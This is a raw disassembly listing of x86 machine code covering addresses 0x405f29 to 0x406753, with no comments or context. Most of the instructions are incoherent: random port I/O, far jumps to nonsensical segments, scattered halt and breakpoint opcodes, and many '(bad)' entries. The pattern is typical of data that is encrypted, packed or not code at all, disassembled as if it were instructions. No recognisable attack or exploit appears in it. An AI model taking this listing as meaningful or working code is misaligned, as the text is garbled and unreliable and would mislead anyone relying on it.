  405f29:	or     ecx,DWORD PTR [ecx+0x56353c5f]
  405f2f:	sti    
  405f30:	jecxz  0x405f3c
  405f32:	push   ebx
  405f33:	cli    
  405f34:	in     al,0x2b
  405f36:	ret    
  405f37:	adc    eax,0xcd515b20
  405f3c:	add    BYTE PTR [ebp-0x29],0x17
  405f40:	bound  esi,QWORD PTR [ebx+0x33bd618a]
  405f46:	and    edx,DWORD PTR [ecx+0x3bc3fe13]
  405f4c:	and    cl,BYTE PTR [edx-0x7e00ccac]
  405f52:	loop   0x405f94
  405f54:	adc    eax,0x187c14ea
  405f59:	pop    ebp
  405f5a:	add    eax,esi
  405f5c:	dec    eax
  405f5d:	(bad)  
  405f5e:	xor    eax,0xf3105e28
  405f63:	int3   
  405f64:	loope  0x405f58
  405f66:	nop
  405f67:	sub    al,0x87
  405f69:	cmp    DWORD PTR [esi+ebx*1],esp
  405f6c:	adc    DWORD PTR [ebx+0x6d5180c6],ecx
  405f72:	jb     0x405f37
  405f74:	pop    es
  405f75:	das    
  405f76:	sbb    eax,DWORD PTR [esi+0x6d]
  405f79:	rcr    dl,1
  405f7b:	neg    BYTE PTR ss:[edx]
  405f7e:	arpl   WORD PTR [ebp+0x31],dx
  405f81:	jmp    0x8190:0xb81e0a31
  405f88:	or     DWORD PTR [edi+0x15],esi
  405f8b:	stos   DWORD PTR es:[edi],eax
  405f8c:	sub    esi,edi
  405f8e:	rcl    BYTE PTR [edx+0x5a2c680a],0x8b
  405f95:	dec    eax
  405f96:	je     0x405f5a
  405f98:	pop    ss
  405f99:	mov    al,ch
  405f9b:	dec    ecx
  405f9c:	in     eax,dx
  405f9d:	test   bl,bl
  405f9f:	sbb    DWORD PTR [edx-0x59827f18],0x89111991
  405fa9:	pop    esp
  405faa:	cmp    eax,0x103f3dd3
  405faf:	and    BYTE PTR [ebx+0x61],0x8e
  405fb3:	pop    ecx
  405fb4:	cmp    eax,0xecc9f0aa
  405fb9:	adc    dl,al
  405fbb:	ret    
  405fbc:	mov    cl,0xd7
  405fbe:	adc    eax,0x44472c59
  405fc3:	or     eax,0x802b3c37
  405fc8:	cmp    eax,0xfb47708f
  405fcd:	add    dh,BYTE PTR [eax+eax*1+0xc]
  405fd1:	mov    esp,0x566619b6
  405fd6:	add    eax,ebp
  405fd8:	cmp    al,0xa0
  405fda:	in     eax,dx
  405fdb:	mov    dl,0x51
  405fdd:	clc    
  405fde:	sbb    BYTE PTR [edx],dh
  405fe0:	arpl   WORD PTR [ebx],bx
  405fe2:	(bad)  
  405fe3:	pushf  
  405fe4:	xor    ebx,ebp
  405fe6:	add    al,BYTE PTR [esp+eax*1+0x45]
  405fea:	lods   eax,DWORD PTR ds:[esi]
  405feb:	aas    
  405fec:	adc    al,0xb0
  405fee:	sbb    ecx,DWORD PTR [edi]
  405ff0:	adc    BYTE PTR [ebx],ch
  405ff2:	lds    ebx,FWORD PTR [ebx-0x30]
  405ff5:	cmp    esi,edx
  405ff7:	xor    ah,BYTE PTR [esi-0x79]
  405ffa:	fdiv   DWORD PTR [esi-0x59]
  405ffd:	mov    ds:0xa16bbda2,al
  406002:	mov    ds:0xc916dea1,al
  406007:	push   es
  406008:	add    edx,DWORD PTR ds:0x93733d4d
  40600e:	push   eax
  40600f:	sahf   
  406010:	sbb    ebx,DWORD PTR ds:0xd660159
  406016:	pop    ebp
  406017:	sbb    BYTE PTR [esi],cl
  406019:	mov    ds:0x86af0821,al
  40601e:	push   0xeec1e837
  406023:	pop    esi
  406024:	ror    BYTE PTR [esi],1
  406026:	xchg   DWORD PTR [edi],eax
  406028:	inc    edx
  406029:	enter  0x2b71,0x40
  40602d:	lock stos BYTE PTR es:[edi],al
  40602f:	xor    eax,0x26a1f28a
  406034:	push   esp
  406035:	jg     0x4060ab
  406037:	daa    
  406038:	mov    edx,DWORD PTR [edi]
  40603a:	sub    edx,esi
  40603c:	aam    0xb8
  40603e:	shl    BYTE PTR [ebp+0x74187a2d],cl
  406044:	add    al,BYTE PTR [edi+eax*1+0x22072601]
  40604b:	pop    esi
  40604c:	rcr    DWORD PTR [esi+0x75],1
  40604f:	(bad)  ds:0x79b20353
  406055:	sahf   
  406056:	jg     0x40604c
  406058:	hlt    
  406059:	add    BYTE PTR [ecx+edi*8+0x262bc1ce],ah
  406060:	mov    ss,esp
  406062:	adc    DWORD PTR [edx+0x7f11480d],ecx
  406068:	hlt    
  406069:	sbb    BYTE PTR [edx],dh
  40606b:	sbb    BYTE PTR [ebx],ah
  40606d:	cmp    al,cl
  40606f:	pop    eax
  406070:	push   edx
  406071:	fdivr  DWORD PTR [eax+eiz*4+0x773c806]
  406078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406079:	hlt    
  40607a:	or     al,0x7e
  40607c:	mov    ds:0x267d8bc9,eax
  406081:	(bad)  
  406082:	in     al,dx
  406083:	push   edi
  406084:	mov    eax,ds:0xaabb0038
  406089:	xor    esi,esi
  40608b:	xchg   ebx,eax
  40608c:	cwde   
  40608d:	dec    ebp
  40608e:	pop    esp
  40608f:	adc    al,0xd7
  406091:	aaa    
  406092:	push   es
  406093:	enter  0xfd20,0xff
  406097:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  40609b:	sub    bl,al
  40609d:	jb     0x4060b9
  40609f:	inc    ebx
  4060a0:	mov    BYTE PTR [ebp-0x1],al
  4060a3:	mov    al,BYTE PTR [ebp-0x2c]
  4060a6:	stos   DWORD PTR es:[edi],eax
  4060a7:	retf   
  4060a8:	out    dx,eax
  4060a9:	(bad)  
  4060aa:	(bad)  
  4060ac:	push   cs
  4060ad:	dec    bl
  4060af:	jne    0x40609b
  4060b1:	add    esi,0x2
  4060b4:	cmp    esi,0xc
  4060b7:	jge    0x4060c3
  4060b9:	sub    eax,0x6375440a
  4060be:	inc    esp
  4060bf:	or     al,0x80
  4060c1:	enter  0x76d,0xf8
  4060c5:	adc    eax,0x1feba26d
  4060ca:	ja     0x4060d3
  4060cc:	add    al,0xdc
  4060ce:	mov    ch,0xf
  4060d0:	xchg   edx,eax
  4060d1:	mov    esi,0x5f782fcf
  4060d6:	inc    edi
  4060d7:	fs inc bh
  4060da:	add    eax,0xcf320976
  4060df:	mov    bl,0x19
  4060e1:	fimul  DWORD PTR [ecx]
  4060e3:	cmp    al,0x0
  4060e5:	inc    eax
  4060e6:	scas   eax,DWORD PTR es:[edi]
  4060e7:	or     ebx,DWORD PTR [esi]
  4060e9:	jno    0x4060f9
  4060eb:	jbe    0x40606f
  4060ed:	mov    ds:0xd8ea0325,eax
  4060f2:	mov    edx,0xe41b0966
  4060f7:	data16 fld QWORD PTR [ebx]
  4060fa:	arpl   di,bx
  4060fc:	pop    ss
  4060fd:	xor    BYTE PTR [edi-0x77],0x15
  406101:	xor    BYTE PTR [ecx+eax*8],cl
  406104:	call   0xbe720413
  406109:	sbb    al,0x8a
  40610b:	jle    0x4060e8
  40610d:	loopne 0x4060b4
  40610f:	pop    esp
  406110:	mov    edi,0x2708b998
  406115:	js     0x4060cd
  406117:	rcr    BYTE PTR [ecx],1
  406119:	push   esi
  40611a:	add    cl,dl
  40611c:	lods   eax,DWORD PTR ds:[esi]
  40611d:	dec    ebx
  40611e:	xchg   esp,eax
  40611f:	ins    BYTE PTR es:[edi],dx
  406120:	jo     0x4060d8
  406122:	rcr    DWORD PTR [ebx+0x5c613df],cl
  406128:	inc    ebp
  406129:	sub    DWORD PTR [esi],eax
  40612b:	inc    esp
  40612c:	out    dx,eax
  40612d:	fucomi st,st(2)
  40612f:	fst    QWORD PTR [edx*4+0x6e1c55d5]
  406136:	mov    eax,0x1d45ba3b
  40613b:	out    dx,eax
  40613c:	outs   dx,DWORD PTR ds:[esi]
  40613d:	mov    al,ds:0xb41c8cb1
  406142:	setne  bl
  406145:	mov    BYTE PTR ds:0xa0c1126,bl
  40614b:	cmp    eax,0x303766ce
  406150:	mov    eax,0xefd02dd0
  406155:	sbb    eax,DWORD PTR [edx]
  406157:	add    al,0x88
  406159:	add    al,BYTE PTR [eax+0x42]
  40615c:	cmp    eax,0x16f575ad
  406161:	push   0x14
  406163:	scas   eax,DWORD PTR es:[edi]
  406164:	add    dl,BYTE PTR [eax]
  406166:	sbb    edx,DWORD PTR [eax+0x66]
  406169:	rcl    BYTE PTR [eax-0x3c],1
  40616c:	js     0x4061d6
  40616e:	imul   bh
  406170:	add    bh,ch
  406172:	add    eax,0xbf5de13b
  406177:	lods   al,BYTE PTR ds:[esi]
  406178:	cmp    esp,DWORD PTR [ecx]
  40617a:	cmp    WORD PTR [edx],0xffb4
  40617e:	adc    al,0xf1
  406180:	mov    esi,0x88c1949d
  406185:	or     eax,0xf3366359
  40618a:	sar    DWORD PTR [edi+0x7548c511],1
  406190:	jmp    0x4aaa9080
  406195:	imul   esi,esp,0x77ec965d
  40619b:	xchg   ebp,eax
  40619c:	shl    BYTE PTR [edx+0x102a6a1c],0x92
  4061a3:	pop    es
  4061a4:	fst    DWORD PTR [eax]
  4061a6:	sub    al,BYTE PTR [edx+0x300f9b7]
  4061ac:	and    bl,BYTE PTR [eax]
  4061ae:	push   ss
  4061af:	ja     0x4061c9
  4061b1:	ins    BYTE PTR es:[edi],dx
  4061b2:	mov    ebp,0x49bd0764
  4061b7:	jne    0x4061b2
  4061b9:	push   ebx
  4061ba:	jge    0x406187
  4061bc:	test   al,0x94
  4061be:	test   BYTE PTR [esi],al
  4061c0:	sbb    BYTE PTR [esi+0x3],dl
  4061c3:	ret    0x4a80
  4061c6:	inc    BYTE PTR [ecx-0x7e7035d7]
  4061cc:	push   edx
  4061cd:	inc    ebx
  4061ce:	mov    ah,0x57
  4061d0:	and    al,ch
  4061d2:	mov    ds:0x14baccb8,eax
  4061d7:	test   al,0xff
  4061d9:	pop    es
  4061da:	cwde   
  4061db:	test   al,0x85
  4061dd:	push   esi
  4061de:	mov    eax,0xb6027245
  4061e3:	sti    
  4061e4:	mov    al,ds:0xba4ce032
  4061e9:	sbb    esp,DWORD PTR [ecx]
  4061eb:	dec    esp
  4061ec:	aam    0x9
  4061ee:	aam    0x14
  4061f0:	push   ebx
  4061f1:	mov    ds:0x640e466,al
  4061f6:	fldenv [ebx]
  4061f8:	call   0x88304a19
  4061fd:	mov    ebp,0x2cb17d39
  406202:	mov    edx,0x1c7f1c0f
  406207:	mov    ds:0xc641127e,al
  40620c:	push   es
  40620d:	in     al,0x2e
  40620f:	mov    edx,0xe4497f0e
  406214:	dec    BYTE PTR [esi]
  406216:	cmp    DWORD PTR [eax+0x3680e419],edx
  40621c:	das    
  40621d:	mov    edx,0x64659e1d
  406222:	inc    eax
  406223:	sbb    esp,0x15d91fec
  406229:	loopne 0x40626b
  40622b:	fmul   QWORD PTR [ecx+edx*8-0x261bf77e]
  406232:	cs jns 0x406215
  406235:	mov    eax,0xfc2cd484
  40623a:	and    BYTE PTR [eax-0x2bf1a6f9],dl
  406240:	fcomp  st(0)
  406242:	mov    eax,0x80c8db88
  406247:	std    
  406248:	mov    cl,0x3a
  40624a:	mov    edx,0xd08c6c1e
  40624f:	aas    
  406250:	adc    al,0x4b
  406252:	adc    BYTE PTR ds:[edx-0x2fccd757],bl
  406259:	mov    eax,0x7903e490
  40625e:	mov    dh,0xcc
  406260:	and    DWORD PTR [eax],esp
  406262:	sub    esp,ecx
  406264:	mov    eax,0x16290d94
  406269:	mov    al,0xb9
  40626b:	ret    0x81c8
  40626e:	or     al,0xb2
  406270:	test   eax,0x54d9c825
  406276:	mov    eax,0x2c157822
  40627b:	test   eax,0x3b0db20
  406280:	cmp    BYTE PTR [esi],cl
  406282:	les    ebp,FWORD PTR ds:[edi+edx*4+0x1c]
  406287:	enter  0xc423,0x3f
  40628b:	popa   
  40628c:	ror    BYTE PTR [ecx],0x19
  40628f:	nop
  406290:	add    DWORD PTR ds:0x90d0c010,0xf
  406297:	in     al,0xf4
  406299:	mov    edx,0x54baf844
  40629e:	outs   dx,BYTE PTR ds:[esi]
  40629f:	out    dx,al
  4062a0:	or     eax,0xfcdf79a8
  4062a5:	push   0xf4070f64
  4062aa:	mov    eax,0x61583b
  4062af:	xchg   ecx,eax
  4062b0:	stos   BYTE PTR es:[edi],al
  4062b1:	das    
  4062b2:	inc    esp
  4062b3:	sbb    al,0x90
  4062b5:	nop
  4062b6:	inc    ecx
  4062b7:	push   es
  4062b8:	jo     0x406256
  4062ba:	or     ebx,DWORD PTR [ebx+eax*1]
  4062bd:	sar    al,cl
  4062bf:	or     al,0x46
  4062c1:	add    esi,0xf372423
  4062c7:	shr    BYTE PTR [eax-0x9ef4540],cl
  4062cd:	retf   
  4062ce:	nop
  4062cf:	adc    DWORD PTR [eax],esi
  4062d1:	dec    edi
  4062d2:	push   es
  4062d3:	ins    DWORD PTR es:[edi],dx
  4062d4:	ja     0x406335
  4062d6:	mov    al,0xe2
  4062d8:	das    
  4062d9:	fs das 
  4062db:	xlat   BYTE PTR ds:[ebx]
  4062dc:	push   edi
  4062dd:	ins    DWORD PTR es:[edi],dx
  4062de:	add    BYTE PTR [eax],ah
  4062e0:	fs sub al,0xd9
  4062e3:	gs inc eax
  4062e5:	mov    al,ds:0x61020320
  4062ea:	ins    DWORD PTR es:[edi],dx
  4062eb:	or     eax,DWORD PTR [edi]
  4062ed:	in     al,dx
  4062ee:	or     esi,DWORD PTR [edx+0x70]
  4062f1:	dec    ebx
  4062f2:	push   0x53686823
  4062f7:	xor    BYTE PTR [ecx+0x1],cl
  4062fa:	and    DWORD PTR [eax],0xfffffffc
  4062fd:	and    eax,0xfb2df00
  406302:	push   cs
  406303:	and    BYTE PTR [ebx-0x253688ac],dl
  406309:	cmp    ah,BYTE PTR [esi-0x7d]
  40630c:	or     edi,DWORD PTR [edx]
  40630e:	jae    0x406383
  406310:	mov    dh,0x80
  406312:	mov    esi,0xe0bbaffa
  406317:	mov    ah,0xf4
  406319:	inc    BYTE PTR [ebx]
  40631b:	sub    dl,BYTE PTR [ebx]
  40631d:	add    eax,0xd424640f
  406322:	or     ebp,DWORD PTR [eax+0x4d0ab5bd]
  406328:	cmp    eax,0x307419e1
  40632d:	in     eax,0x4f
  40632f:	push   0x94434bdc
  406334:	pop    eax
  406335:	mov    eax,0xfc1f55ed
  40633a:	in     al,dx
  40633b:	rdtsc  
  40633d:	imul   ch
  40633f:	popf   
  406340:	cli    
  406341:	pushf  
  406342:	mov    ds:0x52af128,eax
  406347:	or     bh,BYTE PTR cs:[eax+0x90767d0]
  40634e:	add    al,0xa0
  406350:	mov    cl,0x12
  406352:	pop    ebx
  406353:	repz inc eax
  406355:	scas   eax,DWORD PTR es:[edi]
  406356:	(bad)  
  406357:	inc    DWORD PTR [ecx+ebp*2+0x73]
  40635b:	imul   eax,DWORD PTR [esi+0x72],0x65
  40635f:	gs push ebx
  406361:	jo     0x4063c4
  406363:	arpl   WORD PTR [ebp+0x45],sp
  406366:	js     0x406368
  406368:	add    edx,DWORD PTR [ecx-0x4889d726]
  40636e:	ret    0xffe5
  406371:	mov    edx,0x1e27baa6
  406376:	fcom   DWORD PTR [edi+0x7d0bb7c]
  40637c:	sub    al,0xd3
  40637e:	xor    eax,0x2bc86980
  406383:	rcl    BYTE PTR [edi],0x9c
  406386:	pop    ebp
  406387:	shl    DWORD PTR [ecx*2-0x1f4f4f48],cl
  40638e:	test   al,0xf
  406390:	and    BYTE PTR ds:0xa034d34d,dh
  406396:	ins    BYTE PTR es:[edi],dx
  406397:	cwde   
  406398:	xor    al,0x90
  40639a:	shl    DWORD PTR [ecx*2-0x77b7f82d],cl
  4063a1:	add    al,0x80
  4063a3:	or     al,0x4d
  4063a5:	shl    DWORD PTR [ebx*2+0x70d81f78],cl
  4063ac:	or     BYTE PTR [eax+0x0],ch
  4063af:	call   0x7060:0xf59669a6
  4063b6:	pop    eax
  4063b7:	pop    esp
  4063b8:	push   eax
  4063b9:	shl    DWORD PTR ds:0x4817775d,cl
  4063bf:	(bad)  
  4063c1:	inc    eax
  4063c2:	pop    es
  4063c3:	sbb    BYTE PTR [ebp-0x2d],cl
  4063c6:	xor    eax,0x30dc384d
  4063cb:	ja     0x4063b1
  4063cd:	sub    ah,dl
  4063cf:	imul   edi,DWORD PTR [edx-0x68dfca12],0x7
  4063d6:	sbb    BYTE PTR [edi],dl
  4063d8:	pop    eax
  4063d9:	adc    BYTE PTR [edi],al
  4063db:	(bad)  [ebx-0x46]
  4063de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063df:	cwde   
  4063e0:	or     BYTE PTR [edi],dl
  4063e2:	je     0x4063e4
  4063e4:	daa    
  4063e5:	aaa    
  4063e6:	clc    
  4063e7:	xor    al,0x5d
  4063e9:	ja     0x406381
  4063eb:	icebp  
  4063ec:	adc    al,0xeb
  4063ee:	lock or ecx,esp
  4063f1:	add    BYTE PTR [ebx-0x132c9b19],dl
  4063f7:	xchg   esp,eax
  4063f8:	repz call 0x2774e7f2
  4063fe:	mov    ebx,0xf38023e4
  406403:	loopne 0x4063c1
  406405:	fadd   QWORD PTR [esi]
  406407:	imul   ecx,DWORD PTR [esi+0x36],0x9cd8f3b4
  40640e:	aam    0x39
  406410:	fstp   DWORD PTR [esp+ebp*2+0x6cd0f410]
  406417:	hlt    
  406418:	int3   
  406419:	sbb    DWORD PTR [ecx+ebx*1+0x54c8b8a4],esp
  406420:	les    esi,FWORD PTR [ebx-0x4e]
  406423:	sbb    DWORD PTR [esp+ebp*4-0x430b5b40],esp
  40642a:	xor    ecx,DWORD PTR [eax+0x33]
  40642d:	dec    eax
  40642e:	je     0x4063e8
  406430:	add    BYTE PTR [ebp+ecx*8-0x139b1937],dh
  406437:	repz mov al,0x7c
  40643a:	rep lods al,BYTE PTR ds:[esi]
  40643c:	mov    al,ds:0x20cd939a
  406441:	test   al,0x3c
  406443:	hlt    
  406444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406445:	in     al,0x9a
  406447:	inc    ecx
  406448:	call   0x3664:0x9c30a041
  40644f:	daa    
  406450:	fwait
  406451:	inc    ecx
  406452:	cwde   
  406453:	cmp    ah,dh
  406455:	xchg   esp,eax
  406456:	hlt    
  406457:	repz call 0xf378:0x9072cd93
  40645f:	mov    WORD PTR [eax],gs
  406461:	ja     0x406467
  406463:	add    BYTE PTR [ecx-0x78],0x58
  406467:	fnsave [ecx]
  406469:	mov    edi,0x4d20cd20
  40646e:	test   al,cl
  406470:	adc    BYTE PTR [eax+0x27],0x9b
  406474:	xchg   ebx,eax
  406475:	int    0x7c
  406477:	shl    bl,1
  406479:	js     0x4063ff
  40647b:	repz je 0x40641a
  40647e:	ins    BYTE PTR es:[edi],dx
  40647f:	dec    esi
  406480:	ss shl ah,0x70
  406484:	adc    ch,dh
  406486:	ins    BYTE PTR es:[edi],dx
  406487:	out    0x64,eax
  406489:	jae    0x406481
  40648b:	repz inc edi
  40648d:	push   0xcf64f368
  406492:	and    ch,cl
  406494:	pusha  
  406495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406496:	pusha  
  406497:	dec    esp
  406498:	pop    esp
  406499:	hlt    
  40649a:	imul   ecx,DWORD PTR [esi+0x36],0x1c383b67
  4064a1:	hlt    
  4064a2:	xor    al,0xd8
  4064a4:	xchg   edx,eax
  4064a5:	daa    
  4064a6:	push   eax
  4064a7:	add    al,0xd7
  4064a9:	push   ebp
  4064aa:	scas   al,BYTE PTR es:[edi]
  4064ab:	push   ss
  4064ac:	xor    ch,bh
  4064ae:	bound  ecx,QWORD PTR [eax-0x2eb57adf]
  4064b4:	push   esp
  4064b5:	pop    es
  4064b6:	pop    ss
  4064b7:	fistp  QWORD PTR [edi+eax*2-0x67]
  4064bb:	cld    
  4064bc:	add    al,0x74
  4064be:	(bad)  
  4064bf:	in     al,0xb8
  4064c1:	sub    al,0xf2
  4064c3:	sub    edi,ebx
  4064c5:	or     ecx,DWORD PTR [si+0x16]
  4064c9:	add    bl,BYTE PTR [eax-0xb4717cd]
  4064cf:	icebp  
  4064d0:	adc    al,0xe4
  4064d2:	cdq    
  4064d3:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4064d5:	pop    es
  4064d6:	cmp    BYTE PTR [edx+eax*1],ch
  4064d9:	sbb    al,0x38
  4064db:	sbb    al,0x72
  4064dd:	add    BYTE PTR [eax],dl
  4064df:	and    al,0x18
  4064e1:	xchg   edi,eax
  4064e2:	dec    ecx
  4064e3:	and    bh,BYTE PTR [eax]
  4064e5:	adc    edx,ebx
  4064e7:	aad    0x39
  4064e9:	in     al,0x58
  4064eb:	mov    DWORD PTR [eax],edx
  4064ed:	loop   0x4064fe
  4064ef:	loopne 0x406551
  4064f1:	dec    eax
  4064f2:	add    ebp,DWORD PTR [edx+eax*8-0x62]
  4064f6:	push   ebx
  4064f7:	ds sbb al,0x14
  4064fa:	nop
  4064fb:	xor    al,0xf
  4064fd:	nop
  4064fe:	add    al,dl
  406500:	push   es
  406501:	or     al,0x3b
  406503:	xor    eax,DWORD PTR [edi]
  406505:	enter  0x9ca0,0x92
  406509:	cwde   
  40650a:	or     DWORD PTR [edx+edx*4+0x49],esp
  40650e:	es xchg esp,eax
  406510:	nop
  406511:	mov    BYTE PTR [ecx+ecx*2],al
  406514:	es cdq 
  406516:	test   BYTE PTR [eax-0x7a],bh
  406519:	std    
  40651a:	in     al,0xcc
  40651c:	ins    BYTE PTR es:[edi],dx
  40651d:	or     DWORD PTR [eax-0x4b475fcf],edi
  406523:	adc    edx,DWORD PTR [edx]
  406525:	repnz nop
  406527:	sub    BYTE PTR [edi],ah
  406529:	pop    esp
  40652a:	scas   al,BYTE PTR es:[edi]
  40652b:	call   FWORD PTR [esp+eiz*2-0x7c3780f0]
  406532:	sub    eax,0xb8407301
  406537:	adc    BYTE PTR [ebx+0xc],bl
  40653a:	div    BYTE PTR [ecx-0x73d6c356]
  406540:	mov    eax,0x65b409fc
  406545:	pop    ebp
  406546:	loopne 0x4064d6
  406548:	jo     0x4064cc
  40654a:	push   es
  40654b:	xor    eax,0x35dcba46
  406550:	cmp    eax,0xf3621e1b
  406555:	cdq    
  406556:	pusha  
  406557:	test   al,0x8e
  406559:	mov    al,fs:0xd9264240
  40655f:	jb     0x4064f6
  406561:	cld    
  406562:	iret   
  406563:	push   es
  406564:	adc    ch,ah
  406566:	and    BYTE PTR [ebx+0x19177830],0x64
  40656d:	mov    al,0xc9
  40656f:	adc    al,BYTE PTR [edi]
  406571:	pusha  
  406572:	pop    esp
  406573:	inc    edx
  406574:	scas   eax,DWORD PTR es:[edi]
  406575:	jle    0x40658b
  406577:	ja     0x4065f6
  406579:	adc    BYTE PTR [esi+0x39],al
  40657c:	out    dx,al
  40657d:	push   esi
  40657e:	mov    al,0xe9
  406580:	mov    eax,0x17ebe701
  406585:	js     0x40659f
  406587:	push   eax
  406588:	add    al,0x7d
  40658a:	aaa    
  40658b:	test   BYTE PTR [eax-0x619084ec],al
  406591:	hlt    
  406592:	pop    ebp
  406593:	ret    0xcb14
  406596:	dec    esp
  406597:	adc    al,0x9b
  406599:	das    
  40659a:	adc    BYTE PTR es:[ebx],cl
  40659d:	lds    esp,FWORD PTR [edx+0x4c0c9016]
  4065a3:	ja     0x406617
  4065a5:	mov    dl,0xd
  4065a7:	stc    
  4065a8:	imul   BYTE PTR [esi-0x44f39b51]
  4065ae:	pop    edx
  4065af:	sbb    eax,0x65203006
  4065b4:	cs aad 0x6
  4065b7:	add    bl,BYTE PTR [edx+0x4140af9]
  4065bd:	jmp    0xe3d4f960
  4065c2:	sbb    al,0x85
  4065c4:	in     al,0x81
  4065c6:	lods   eax,DWORD PTR ds:[esi]
  4065c7:	mov    ch,0xaf
  4065c9:	cld    
  4065ca:	mov    dl,0x53
  4065cc:	out    dx,eax
  4065cd:	dec    eax
  4065ce:	pop    ecx
  4065cf:	push   0x79006b37
  4065d4:	adc    BYTE PTR [edx+0x1a],dh
  4065d7:	mov    al,0x65
  4065d9:	test   al,0x11
  4065db:	xor    al,BYTE PTR [edx+esi*2]
  4065de:	and    DWORD PTR [eax+0xc81186],esi
  4065e4:	jb     0x406662
  4065e6:	lea    eax,[ecx]
  4065e8:	in     al,0x44
  4065ea:	fdiv   st,st(2)
  4065ec:	xlat   BYTE PTR ds:[ebx]
  4065ed:	jge    0x4065e7
  4065ef:	inc    esp
  4065f0:	enter  0x9023,0xf9
  4065f4:	pop    esi
  4065f5:	mov    cl,0x8c
  4065f7:	xchg   edx,eax
  4065f8:	add    ebx,eax
  4065fa:	aam    0x6b
  4065fc:	gs mov cl,0xdf
  4065ff:	mov    eax,ds:0xa9e751c8
  406604:	jno    0x4065e3
  406606:	pop    edi
  406607:	mov    dl,0x1c
  406609:	and    DWORD PTR ds:0x558df8f8,ebp
  40660f:	fsubrp st(2),st
  406611:	and    eax,0x56ff9b
  406616:	cmp    BYTE PTR [ebp-0x6c],0xf5
  40661a:	sbb    eax,eax
  40661c:	xchg   edx,eax
  40661d:	xchg   ecx,eax
  40661e:	leave  
  40661f:	out    dx,al
  406620:	mov    ah,BYTE PTR [esi-0x77]
  406623:	add    bh,BYTE PTR [esi-0x1c]
  406626:	clc    
  406627:	adc    BYTE PTR [ecx],bh
  406629:	push   ss
  40662a:	xchg   esi,eax
  40662b:	jmp    0x40660e
  40662d:	dec    ebx
  40662e:	jle    0x4065d6
  406630:	xor    BYTE PTR [ebx],cl
  406632:	pushf  
  406633:	test   BYTE PTR [eax-0x4e],dl
  406636:	push   es
  406637:	mov    edi,DWORD PTR [edx]
  406639:	nop
  40663a:	adc    BYTE PTR [ebx],bl
  40663c:	cwde   
  40663d:	cld    
  40663e:	test   eax,0x306a8d73
  406643:	dec    esi
  406644:	cmp    DWORD PTR [edx],ecx
  406646:	xor    dl,ah
  406648:	imul   eax,DWORD PTR [esp+ebx*4+0x57f1db6c],0x900930b2
  406653:	or     DWORD PTR [eax+edx*4+0x6f],ebp
  406657:	rol    BYTE PTR [edi],0x20
  40665a:	pop    ss
  40665b:	enter  0xb875,0xc7
  40665f:	adc    al,0x1a
  406661:	inc    edx
  406662:	js     0x406684
  406664:	xor    al,0xb3
  406666:	fs pop ds
  406668:	adc    BYTE PTR [eax+esi*2+0x108dc03],bh
  40666f:	inc    esp
  406670:	inc    eax
  406671:	lea    ecx,[ebp-0x10]
  406674:	dec    eax
  406675:	(bad)  
  406676:	mov    gs,ecx
  406678:	push   esi
  406679:	pushf  
  40667a:	jae    0x406690
  40667c:	cmp    esi,DWORD PTR [ebx-0x7a8a4df4]
  406682:	aad    0x90
  406684:	arpl   WORD PTR [eax+0x54],bx
  406687:	push   0xffffffc8
  406689:	and    BYTE PTR [ebx+0x3b444c50],al
  40668f:	add    bh,BYTE PTR [edx]
  406691:	mov    ss,ebx
  406693:	stc    
  406694:	jns    0x406692
  406696:	pop    es
  406697:	mov    BYTE PTR [ecx+0x2c],dl
  40669a:	cmc    
  40669b:	push   eax
  40669c:	repnz cli 
  40669e:	mov    ebx,0x6c51aaad
  4066a3:	arpl   WORD PTR [edx],ax
  4066a5:	sbb    eax,0xe8415bc2
  4066aa:	arpl   WORD PTR [ecx+0x7b],dx
  4066ad:	push   ecx
  4066ae:	push   0x15eeb588
  4066b3:	jo     0x406672
  4066b5:	inc    esp
  4066b6:	or     DWORD PTR [ebp-0x46],edx
  4066b9:	add    BYTE PTR [ecx],al
  4066bb:	mov    ecx,0x9fc0cd9e
  4066c0:	adc    ah,BYTE PTR [ebx-0x675ca6a0]
  4066c6:	aas    
  4066c7:	adc    eax,0xe4b9ac30
  4066cc:	xchg   edx,eax
  4066cd:	dec    ebx
  4066ce:	pushf  
  4066cf:	mov    ah,0xa0
  4066d1:	cs mov ecx,0xbc3c19e4
  4066d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d8:	les    edi,FWORD PTR [ecx-0x57b46d1c]
  4066de:	int3   
  4066df:	lods   al,BYTE PTR ds:[esi]
  4066e0:	in     al,0x92
  4066e2:	dec    ebx
  4066e3:	cs aam 0xb0
  4066e6:	fcom   QWORD PTR [edx-0x4b46d1b5]
  4066ec:	in     al,0xb8
  4066ee:	dec    ebx
  4066ef:	cs mov ecx,0xf4bcece4
  4066f5:	sbb    DWORD PTR [ecx-0x33f6d1c],edi
  4066fb:	les    ecx,FWORD PTR [eax-0xe]
  4066fe:	mov    WORD PTR [edx+esi*8+0x4],cs
  406702:	mov    dh,0xc8
  406704:	push   esp
  406705:	or     al,0x5c
  406707:	repnz mov WORD PTR [esp+ecx*8-0x40],ds
  40670c:	sbb    al,0xd0
  40670e:	inc    esi
  40670f:	imul   ecx,DWORD PTR cs:[esi-0x2bd34fd4],0x2e473498
  40671a:	jns    0x406758
  40671c:	fadd   DWORD PTR [ecx+esi*4]
  40671f:	dec    esp
  406720:	xchg   edi,eax
  406721:	cmp    al,0x23
  406723:	xchg   edi,eax
  406724:	fdiv   QWORD PTR [eax+0x5c]
  406727:	loopne 0x40674c
  406729:	xchg   edi,eax
  40672a:	cmp    al,0x23
  40672c:	lock ins BYTE PTR es:[edi],dx
  40672e:	in     al,0x60
  406730:	sahf   
  406731:	xchg   ecx,eax
  406732:	dec    ebx
  406733:	call   0xfe8c:0xd0e87cb2
  40673a:	inc    edx
  40673b:	cwde   
  40673c:	dec    ebx
  40673d:	in     al,dx
  40673e:	pop    ss
  40673f:	outs   dx,DWORD PTR ds:[esi]
  406740:	ins    BYTE PTR es:[edi],dx
  406741:	gs popa 
  406743:	jne    0x4067b9
  406745:	sahf   
  406746:	inc    ecx
  406747:	mov    cl,0xa4
  406749:	stos   DWORD PTR es:[edi],eax
  40674a:	cmp    eax,0xa99f6843
  40674f:	fwait
  406750:	sub    dh,BYTE PTR [ecx]
  406752:	push   esp
  406753:	jns    0x4067c5
